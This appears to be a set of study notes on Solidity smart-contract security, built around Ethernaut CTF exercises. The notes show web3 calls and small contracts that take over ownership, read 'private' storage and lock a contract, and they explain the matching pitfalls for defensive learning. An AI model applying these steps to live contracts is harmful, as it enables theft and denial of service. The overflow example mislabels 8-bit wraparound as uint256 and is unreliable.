## Interacting with contracts

### Payable functions
When calling on the abi of a contract, you can specify the value of the message by entering the value in the parentheses.
Notice how there are no arguments for the contribute function, but we can still add a payload of `value` to the message. This is because the `contribute` function is `payable`.

```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
}

// Using the web3 library
contract.contribute({value: toWei("0.0005")})
```

### Non-Payable functions
Now we will try to attach a value to the call of a non-payable function. The EVM will throw an error and revert our transaction.

```
function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
}

// call function
contract.collectAllocations({value: toWei("0.001")})
returns => Error in RPC response: execution reverted
```

### Targeting the receive function of a contract

In 1.Fallback of the Ethernaut CTFs, we can take control of the contract by sending eth directly to the contract address, which triggers the `receive` function.

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

We can do this by using the sendTransaction function of the web3 library.

```
contract.sendTransaction({value: toWei("0.001")})
```

More info:
https://solidity-by-example.org/sending-ether/
https://docs.soliditylang.org/en/v0.8.19/contracts.html#special-functions
https://blog.soliditylang.org/2020/03/26/fallback-receive-split/

## Security Red Flags

### delegatecalls
`delegatecall` is a low level function similar to `call`.

When contract A executes delegatecall to contract B, B's code is executed with contract A's storage, msg.sender and msg.value.

Therefore, we can replace the storage value of contract B with whatever we want, meaning we can take control of the contract.

```
contract B {
    // NOTE: storage layout must be the same as contract A
    uint public num;
    address public sender;
    uint public value;

    function setVars(uint _num) public payable {
        num = _num;
        sender = msg.sender;
        value = msg.value;
    }
}

contract A {
    uint public num;
    address public sender;
    uint public value;

    function setVars(address _contract, uint _num) public payable {
        // A's storage is set, B is not modified.
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}
```

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

More info:
https://solidity-by-example.org/delegatecall/
https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4

### tx.origin vs msg.sender

Using tx.origin is dangerous as it can be a vulnerability in a smart contract that allows an attacker to bypass security checks.

A simple example is found in the ethernaut Telephone CTF.

We can create an attacker contract we can use as a proxy to attack the Telephone contract and call the change owner function.
- tx.origin will be the address of the EOA that initiates the attack
- msg.sender will be the address of the attacker contract
- The check of tx.origin != msg.sender will then pass

```
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

msg.sender is the last caller while tx.origin is the original caller of the recursive function chain.

### Sensible access modifiers
How can we change the access modifiers of the functions?
If someone with no access rights can call a function, what can they do?
Need to check public/external functions and see what damage they could do if called by anyone.

### Using a poor random number generation technique
How can we generate a random number safely, are they using Chainlink VRF?
Avoid using a FACTOR and blocknumber to generate a random number.

### Owner of contract changing
Easy inroad for an attacker to take control of the contract and if necessary, a massively crucial part of the contract to be safe.

### Storing sensitive values on chain
State variables marked as private are actually accessible publicly through a few clever lines of code.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

e.g. The Vault CTF from ethernaut
```
// We can use web3.getStorageAt to get the value of the password, if we know the storage slot
web3.eth.getStorageAt("0xAFe83D26Dd816488c89bf8cf925D8156f272676A", 1, (err,res)=>{console.log(res)}); 
=> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29") 
=> 'A very strong secret password :)'
```

## Remix

### Setting msg.value in the Remix console

In the LHS of the Remix console when deploying a contract, you can set the value of your message in Wei / Ether / etc.

```
contract Exploit{

    constructor(address payable _kingAddress) payable {
        _kingAddress.call{value: msg.value}("");
    }

}
```

## web3 library
### Useful functionality

```
// Gets the balance of a specificed EOA or contract address
web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec")
```

```
// Send transaction within web3 js environment
web3.eth.sendTransaction({to:'0x2eadef55007191c8e4be24df228a2e3e54e093d7', from:player, value: toWei("0.001")})
```

```
// Get the storage at a specific index of a contract
web3.eth.getStorageAt("0xAFe83D26Dd816488c89bf8cf925D8156f272676A", 1, (err,res)=>{console.log(res)});
```

```
// utility functions e.g. to convert hex to ascii
web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

## Unsafe mathematical operations
### Overflow/Underflow

As is the nature of unsigned ints, if we try to add a number to a uint that is larger than the max value of a uint, it will overflow and wrap around to 0.

```
// Overflow
uint256 240 + 20 = 14

// Underflow
uint256 10 - 11 = 255
```

### Dividing by zero

Any instance of a division by 0 is highly dangerous and should be avoided at all costs.

## Methods of sending ETH to an EOA/contract

### Selfdestruct
Can use selfdestruct to force a contract to accept ETH regardless of whether it has a receive/fallback function.

Therefore, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

```
contract Force {
    // No functionality but will receive ETH if the selfdestruct function is called from a malicious contract
}
```

## Locking a contract

### Using an intermediate SC to lock a contract


As seen in Ethernaut L9...
```
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

Here we can set ourselves to be the king, and then we can then use a smart contract with no fallback or receive function to make the receive function throw an error. 
This means noone else can be set to be the king and the game is locked.

To avoid this, we should use appropiate error handling.

## Storage

### How to read Ethereum contract storage

Great article: https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925